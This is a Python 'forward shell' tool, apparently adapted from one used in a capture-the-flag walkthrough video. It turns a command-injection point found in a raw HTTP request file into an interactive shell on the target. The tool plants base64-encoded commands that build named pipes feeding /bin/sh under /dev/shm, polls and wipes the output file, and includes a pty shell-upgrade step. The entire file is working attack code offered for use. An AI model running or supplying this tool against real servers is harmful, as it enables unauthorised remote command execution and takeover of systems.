#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Forward Shell Skeleton code that was used in IppSec's Stratosphere Video
# -- https://www.youtube.com/watch?v=uMwcJQcUnmY
# Authors: ippsec, 0xdf


import base64
import random
import requests
import threading
import time

# all purpose mod imports
import argparse
import email # to read raw HTTP request
from io import StringIO
import json

class WebShell(object):

    # Setup argparser
    parser = argparse.ArgumentParser(
            prog="Forward Shell",
            description="An all purpose expansion over ippsec's forward shell script")
    parser.add_argument('-r', '--request', required=True, help='Request file to read from. Replace injection point with keyword INJECT') # request file to read from
    parser.add_argument('-i', '--interval', type=float, required=True, help='Time between two read requests') # interval between every read request
    parser.add_argument('-p', '--proxy', required=False, help='Proxy for debugging') # proxy for debugging
    
    # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
    def __init__(self):
        
        # Get all arguments
        args = self.parser.parse_args()
        
        # Read request file
        self.request_object = self.ReadHttpRaw(args.request)
        
        # setup misc
        self.proxies = {'http' : args.proxy}

        # setup session
        session = random.randrange(10000,99999)
        print(f"[*] Session ID: {session}")
        self.stdin = f'/dev/shm/input.{session}'
        self.stdout = f'/dev/shm/output.{session}'
        self.interval = args.interval

        # set up shell
        print("[*] Setting up fifo shell on target")    
        MakeNamedPipes = "echo -n "+base64.b64encode(f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}".encode('utf-8')).decode('utf-8')+"|base64 -d|bash"
        self.RunRawCmd(MakeNamedPipes, timeout=0.1)

        # set up read thread
        print("[*] Setting up read thread")
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    # Read raw HTTP request
    # Request Object:
    # {
    #   'request_line': {
    #       'verb':'POST',
    #       'endpoint':'/webshell.php',
    #       'version':'HTTP/1.1'
    #       }
    #   'headers':{
    #       'Host':'127.0.0.1',
    #       'Cookies': 'session=ad343fvdj675'
    #   }
    #   'data':{
    #       'cmd':'whoami',
    #       'username':'username',
    #       'password':'password'
    #   }
    # }
    def ReadHttpRaw(self, requestFile):
        request_object = {'request_line': {}}
        with open(requestFile, 'r') as f:
            raw_request = [i.strip('\n') for i in f.readlines()]
            request_line, headers, body = raw_request[0], raw_request[1:raw_request.index('')], raw_request[raw_request.index('')+1::]
            
            # convert requestline to list, to get verb, endpoint and http version
            request_line = request_line.split(" ")
            request_object['request_line']['verb'] = request_line[0]
            request_object['request_line']['endpoint'] = request_line[1]
            request_object['request_line']['version'] = request_line[2]
            
            # convert headers to a nice dict, https://stackoverflow.com/questions/39090366/how-to-parse-raw-http-request-in-python-3
            raw_headers = "\r\n".join(headers)
            message = email.message_from_file(StringIO(raw_headers))
            headers = dict(message.items())
            request_object['headers'] = headers

            # convert body to data dict if body exists, ie request is not get
            if request_object['request_line']['verb'] != 'GET':
                better_body = []
                for content in body:
                    try:
                        content = content.split('&')
                    except:
                        content = list(contnent)
                    content = [i.split('=') for i in content]
                    for i in content:
                        better_body.append(i)

                request_object['data'] = dict(better_body)
            else:
                request_object['data'] = {}

        return request_object

    # Read $session, output text to screen & wipe session
    def ReadThread(self):
        GetOutput = f"/bin/cat {self.stdout}"
        while True:
            result = self.RunRawCmd(GetOutput) #, proxy=None)
            if result:
                print(result)
                ClearOutput = f"echo -n '' > {self.stdout}"
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval)
        
    # Execute Command.
    def RunRawCmd(self, cmd, timeout=50):
        #print(f"Going to run cmd: {cmd}")
        # MODIFY THIS: This is where your payload code goes
        payload = cmd
        attack_object = json.dumps(self.request_object)
        attack_object = attack_object.replace('INJECT', payload)
        attack_object = json.loads(attack_object)
        
        if self.proxies:
            proxies = self.proxies
        else:
            proxies = {}
         
        try:
            r = requests.request(attack_object['request_line']['verb'],
                                 "http://"+attack_object['headers']['Host']+attack_object['request_line']['endpoint'],
                                 headers=attack_object['headers'],
                                 data=attack_object['data'],
                                 proxies=self.proxies,
                                 timeout=timeout
                                 )

            return r.text
        except Exception as e:
            print("[!] Error: "+str(e))
            
    # Send b64'd command to RunRawCommand
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f'echo {b64cmd} | base64 -d > {self.stdin}'
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.1)

    def UpgradeShell(self):
        # upgrade shell
        UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null"""
        self.WriteCmd(UpgradeShell)

prompt = "Please Subscribe> "
S = WebShell()
while True:
    cmd = input(prompt)
    if cmd == "upgrade":
        prompt = ""
        S.UpgradeShell()
    else:
        S.WriteCmd(cmd)
